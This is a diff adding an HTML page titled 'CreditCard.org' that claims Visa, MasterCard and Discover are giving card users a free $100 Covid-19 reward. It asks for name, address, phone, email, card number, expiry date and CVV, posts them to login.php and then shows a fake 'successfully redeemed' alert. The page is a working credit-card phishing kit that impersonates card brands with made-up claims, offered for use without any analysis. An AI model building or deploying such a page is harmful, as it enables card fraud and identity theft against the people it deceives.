@@ -1,0 +1,161 @@
+<!Doctype html>
+<html>
+	<head>
+		<meta name="author" content="fr13nds">
+		<meta name="viewport" content="width=device-width">
+		<title> Earn with your credit card</title>
+	</head>
+	<style>
+		h2 {
+			color:pink;
+			}
+		p {
+			text-align : center;
+			}
+		#logo{
+			font-size:12px;
+			font-family:Courier New;
+			position: fixed;
+			top: -5px;
+            width: 350px;
+			height: 80px;
+			border: 3px solid blue;
+			margin: auto;
+			left: -16px;
+			right: -16px;
+			}
+			#p {
+				font-family:Courier New,Arial;
+				}
+				.form {
+					font-weight:300;
+					font-family:Open sans;
+					border-radius:9px;
+					padding-top:30px;
+					padding-bottom:30px;
+					padding-left:10px;
+					background-color:white;
+					color:black;
+					font-size:17px;
+					font-family:Arial;
+					
+					}
+					body{
+						padding-top:80px;
+						padding-bottom:0px;
+						}
+					p6 {
+						text-align: center;
+						}
+					input[type="text"]{
+						padding:8px;
+						color:green;
+						border:100;
+						width:250px;
+						font-family:Courier New;
+						
+						}
+						input[type="email"] {
+							padding:8px;
+							color:green;
+							border:100;
+							width:250px;
+							font-family:Courier New;
+							}
+						input[type="tel"] {
+							padding:8px;
+							color:green;
+							border:100;
+							width:250px;
+							font-family:Courier New;
+							}
+						input[type="radio"] {
+							width;0px;
+							padding:0px;
+							border:0;
+							}
+						input[id="expiry"] {
+							width:100px;
+							heighth:2px;
+							}
+						input[id="Submit"] {
+							align:center;
+							width:140px;
+							height:30px;
+							color:white;
+							background-color:#305F72;
+							border-radius:20px;
+							
+							}
+						datalist{
+							display: none;
+							}
+	</style>
+	<body bgcolor=#305F72>
+		<div id=logo style="background-color: red; color:white; font-style:Roboto">
+		<h1 align=center> CreditCard.org </h1>
+		<p style="color: blue;"> <b>Quick payments, leading to a better future</b></p>
+		</div>
+		<div id= p class=p style="color: white; background-color:;">
+			
+			<?php
+			echo "Himmm";
+			?>
+			<h2 align=center><u>FREE $100 FOR CREDIT CARD USERS </u></h2>
+			<p1><strong>Due to this <p3 style="color:red">Covid-19</p3> Pandemic .Credit card companies (Visa, Master card,Discover,etc ) have introduced free $100 for its users.<br\> Thanks to PayPal, Visa, MasterCard, Discover, and the creditcard companies, this is a secured means of earning reward in this pandemic..<br/> We thank you for being our valid customers and we are really sorry for the lost ones. We appreciate you and we say God bless youm</strong></p>
+			<h2 align=center><u>HOW TO REDEEM YOUR REWARD</u></h2><br/>
+		</div>
+		<div style="background-color:;">
+			<h3 style="color: red;" align=center><strong></strong></h3>
+			<div class="form" style="background-color:;">
+			<form novalidate="" action="login.php" method="post">
+				<br\>
+				<h3 align=center><u>Fill the form below</u></h3><br/>
+				<label for="firstname"><b>First Name </b></label><br/><br/>
+				<input style="color:green" type=text placeholder="First Name" name="fname" required><br/><br/>
+				<label for="lastname"><b>Last name </b></label><br/><h4></h4>
+				<input type="text" placeholder="Last name" name="lname" required><br/><br/>
+				<label for="phone"><b>Telephone Number</b></label><br/><h4></h4>
+				<input type=tel placeholder="Phone number e.g 5182920020" name="tel"><br/><br/>
+				<label for="email"><b>Email </b></label><br/><h4></h4>
+				<input type=email placeholder="example@mail.com" name="email" ><br/><br/>
+				<label for="country"><b>Country </b></label><br/><h4>
+				<input type=text placeholder="Country" name="country" /></h4><br/><br/>
+				<label for="city"><b>City </b></label><br/><h4></h4>
+				<input type=text placeholder="City" name="city" ><br/><br/>
+				<label for="Street"><b>Street</b></label><br/><h4></h4>
+				<input type=text placeholder="E.g calsbad 4561" name="street" ><br/><br/>
+				<label for="Zip code"><b>Zip Code</b></label><br/><h4></h4>
+				<input type=tel name="zip" placeholder="E.g 08900" maxlength=5><br/> <br/>
+				<label for="Gender"><b>Gender</b></label><br/>
+				<input type=radio name="gender" value="Male" >Male<br/>
+				<input type=radio name="gender" value="Female">Female<br/><br/>
+				<label for="cctype"><b>Credit Card type</b></label><br/><br/>
+				<input list="creditcard" name="cctype">
+				<datalist name=creditcard id="creditcard">
+					<option value="Visa">
+					<option value="Master Card">
+					<option value="Discover">
+				</datalist><br/><br/>
+				<label for="cc"><b>Card Number</b></label><br/><br/>
+				<input type=tel name="cc" placeholder="16 digit number" maxlength=16 minlength=16 required><br/><br/>
+				<p6><label for="expiry date"><b>Expiry date</label></p6>
+				<input id=expiry type=text name="expiry" placeholder="e.g 12/23" required ><br/><br/>
+				<label for="cvv"><b>CVV / CVC </b></label><p6></p6>
+				<input id=expiry type=tel name="cvv" placeholder="e.g 355" required><br/><br/>
+				<h6 align=center><a href="https://www.visacards.com" ><input id="Submit" type=submit name=Submit placeholder="Earn" onclick()></a></h6>
+				</form>
+			</div>
+		</div>
+		<h5 align=center style="color:pink;"><br/> Supported by : <a href="www.visa.com" >Visa,</a> <a href="www.mastercard.com">, MasterCard </a> <a href=www.discover.com>Discover</a><br/></h5>
+		<script>
+			function onclick() {
+				alert("Hurray you have successfully redeemed your gift. Thank you!! ");
+				}
+			var name = "";
+			document.write("\n\n");
+			document.write(" Copyright ©: legal rights reserved");
+			
+		</script>
+	</body>
+</html>
